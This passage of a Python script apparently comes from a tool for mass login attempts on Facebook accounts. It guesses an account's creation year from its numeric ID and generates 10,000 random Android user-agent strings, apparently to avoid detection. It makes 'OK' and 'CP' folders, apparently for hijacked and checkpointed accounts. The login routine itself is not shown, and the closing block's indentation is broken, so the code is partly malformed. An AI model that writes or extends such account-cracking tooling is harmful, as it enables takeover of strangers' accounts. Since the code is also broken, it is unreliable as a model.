			waktu(31)
	loop+=1
def cektahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
		elif fx[:6] in ['100004']          :tahunz = '2012'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2016'
		elif fx[:5] in ['10002']           :tahunz = '2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006']           :tahunz = '2021'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['10007','10008']:tahunz = '2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008'
	elif len(fx)==8:
		tahunz = '2007'
	elif len(fx)==7:
		tahunz = '2006'
	else:tahunz=''
	return tahunz

for xd in range(10000):
	rr = random.randint; rc = random.choice
	browser = ['OPR/53.2.2254.55976','HeyTapBrowser/45.10.5.1.1','[FBAN/EMA;FBLC/pt_BR;FBAV/269.0.0.8.118;]','YaApp_Android/9.85 YaSearchBrowser/9.85','[FB_IAB/FB4A;FBAV/405.0.0.23.72;]','SznProhlizec/10.1.2a','XiaoMi/MiuiBrowser/12.11.0-gn','GoogleApp/14.34.24.28.arm64','VivoBrowser/8.7.0.1'] 
	zahra = f"Mozilla/5.0 (Linux; Android {str(rr(1,16))}; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36 {str(rc(browser))}"
	firman = f"Mozilla/5.0 (Linux; Android {str(rr(1,16))}; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(50,140))}.0.{str(rr(3990,5001))}.{str(rr(20,170))} Mobile Safari/537.36"
	firzah = random.choice([firman,zahra])
	user.append(firzah)
if __name__=="__main__":
    try:
        os.mkdir('OK')
    except:
        pass
    try:
        os.mkdir('CP')
    except:
        pass
        os.system('git pull')
        #zahra_animasi2(f'\n{xxx}   ({h}mampir bang ke TikTok{xxx})')
        #waktu(3)
        #os.system("xdg-open https://vm.tiktok.com/ZSFkD95KT/")
        log_zar() 
	